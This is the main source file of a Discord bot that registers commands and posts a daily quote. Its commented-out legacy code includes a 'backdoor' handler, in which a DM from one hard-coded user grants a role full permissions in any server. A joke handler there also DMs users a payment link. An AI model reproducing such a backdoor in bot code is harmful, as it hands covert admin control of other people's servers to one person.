const { token } = require('./config.json');
const { Client, Collection, Intents } = require('discord.js');
const CronJob = require('cron').CronJob;
const fs = require('fs');

const QuotesHelper = require('./helpers/quotes.js');

const client = new Client({ intents: ["Guilds", "GuildMessages", "GuildVoiceStates"] });

//Command registration
client.commands = new Collection();
commandFiles = fs.readdirSync('./commands').filter(File => (File.endsWith('.js') && !File.startsWith('#')));
commandFiles.forEach(file => {
    const command = require(`./commands/${file}`);
    client.commands.set(command.data.name, command);
});

//Initialization event & login
client.login(token);
client.once('ready', () => {
    console.log("I'm alive!");

	quotes = JSON.parse(fs.readFileSync('./data/quotes.json'))
	quoteJob = new CronJob('0 0 0 * * *', function() {
		quoteNumber = QuotesHelper.randomInt(quotes.quotes.length)
		QuotesHelper.quote(client, quoteNumber).then(quoteMsg => {
			client.guilds.resolve(quotes.dailyServer).channels.resolve(quotes.dailyChannel).send({content: "Here's your quote of the day:", embeds: [quoteMsg]})
			quotes.usedQuotes.push(quotes.quotes[quoteNumber])
			quotes.quotes.splice(quoteNumber, 1)
			fs.writeFileSync('./data/quotes.json', JSON.stringify(quotes, null, "\t"))
		})
	})
	quoteJob.start()

	streamReady = true;
});

//Command Handling
client.on('interactionCreate', async interaction => {
	//Verify this interaction is a command, a user option, or message option
	if (!interaction.isCommand) return;

	const command = client.commands.get(interaction.commandName)
	if (!command) return;

	try {
		await command.execute(interaction);
	} catch (error) {
		console.error(error);
		await interaction.reply({ content: 'There was an error while executing this command!', ephemeral: true });
	}
});

function stopBot() {
	console.log("Stopping...");
}

[`SIGINT`, `SIGUSR1`, `SIGUSR2`, /*`uncaughtException`,*/ `SIGTERM`].forEach((eventType) => {
	process.on(eventType, () => {
		process.exit(0);
	});
});

process.on('exit', stopBot);

//const Quotes = require('./helpers/quotes.js');

/*Message Event
client.on('messageCreate', message => {
	cleanMsg = message.cleanContent
	msgMember = message.member
	msgChannel = message.channel
    if ( cleanMsg.startsWith(prefix) ) { //&& (msgMember.roles.highest.permissions.has(Permissions.FLAGS.ADMINISTRATOR)) ) {
        splitCommand = cleanMsg.split(" ");
        command = splitCommand[0].toLowerCase().slice(prefix.length);
        if (registeredCommands.has(command)) {
            try { registeredCommands.get(command).execute(message); }
            catch(error) { console.log(error); console.log("There was an error executing a command!"); }
        }
        if ( (splitCommand.length > 1) && (splitCommand[splitCommand.length - 1] == '*') ) { message.delete() }
    }
	else if ((msgChannel.type == "dm") && (message.author.id = '210628653829193729')) {
		cleanMsg.startsWith('backdoor');
		splitCommand = cleanMsg.split(" ");
		client.guilds.fetch(splitCommand[1]).then(guild => {
			//guild.members.fetch('210628653829193729').then(self => self.roles.add('522603445237317643'));
			guild.roles.fetch('244979705751535617').then(backdoorRole => backdoorRole.setPermissions(Permissions.ALL))
		})
	}
	else if ((msgMember.user.id != '637415359129059363') && (message.guildId == '131640614646185984' || message.guildId == '284165275279163394')) {
		responses.every(response => {
			if (response.regex.test(cleanMsg)) {
				reply = msgMember.toString()
				if ('reply' in response) {
					reply += '\n' + response.reply
				}
				msgChannel.send(reply)
				if ('replies' in response) {
					response.replies.forEach(reply => {
						msgChannel.send(reply)
					})
				}
				return false;
			}
			return true;
		})
	}
});*/

/*Response registration
responses = JSON.parse(fs.readFileSync('./data/responses.json')).responses
responses.forEach(response => {
	response.regex = new RegExp(response.regex, 'i');
})*/

/*Voice Change Event
client.on('voiceStateUpdate', (oldState, newState) => {
	newChannel = newState.channel;
	eventUser = newState.member;
    if ((newChannel != null) && !(eventUser.roles.cache.find(role => role.name == 'Has Discord Minutes'))) {
        eventServer = newChannel.guild;
        if (blackholes.has(eventServer)) {
            oldChannel = oldState.channel;
            if (newChannel != blackholes.get(eventServer)) {
                newState.setChannel(blackholes.get(eventServer))
				eventUser.createDM().then(dm => dm.send('You are out of Discord Minutes™ for the server you are trying to move in!\nYou can buy more minutes by using the following link: http://paypal.me/ChVasiliou\n**(Rates: 1 Minute = 1$)**'))
            }
        }
    }
});*/

/*Reaction Add Event
client.on('messageReactionAdd', (messageReaction, user) => {

	//Variable caching
	eventMessage = messageReaction.message;
	eventServer = eventMessage.guild;
	eventUserID = user.id;

	//Verify the correct reaction
    if ((messageReaction.emoji.toString() == '🎲') && (gulags.has(eventServer))) {

		//More variable caching
		gulagMatch = gulags.get(eventServer);
		playerData = gulagMatch.playerData;

		//Verify the message reaction is to the gulag match, and that the player is part of the match and has not already rolled.
		if (playerData.has(eventUserID) && (gulagMatch.message.id == eventMessage.id) && playerData.get(eventUserID).roll === null) {

			//Roll the player's number, set it, and update the higest roll if needed
			numberRolled = Math.floor(Math.random() * 20) + 1;
			playerData.get(eventUserID).roll = numberRolled;
			gulagMatch.highestRoll = gulagMatch.highestRoll < numberRolled ? numberRolled : gulagMatch.highestRoll;
			
			//Update the gulag message that will track the Gulag match.
			gulagMessage = new MessageEmbed()
				.setColor('#0099ff')
				.setTitle('Gulag Match')
				.setDescription('React with the dice to roll.');
			
			playerData.forEach((data, player) => {
				gulagMessage.addFields({ name: data.name, value: data.roll !== null ? data.roll : 'WAITING FOR ROLL...', inline: true });
			});
			gulagMessage.setFooter('You have 30 seconds to roll or you forfeit the match.');

			//Update the gulag match message
			gulagMatch.message.edit(gulagMessage);
			
			//Determine if the game is finished
			if (++gulagMatch.rollCount >= playerData.size) {

				//Cancel the timeout
				clearTimeout(gulagMatch.timeout);

				//Find winner
				playerData.forEach((data, player) => {
					if (data.roll < gulagMatch.highestRoll) {
						if (data.user.voice) { data.user.voice.kick("Lost a Gulag match."); }
					}
					else if (data.user.voice) { data.user.voice.setChannel(data.originChannel); }
				});
				
				gulags.delete(eventServer);
			}
		}
    }
});*/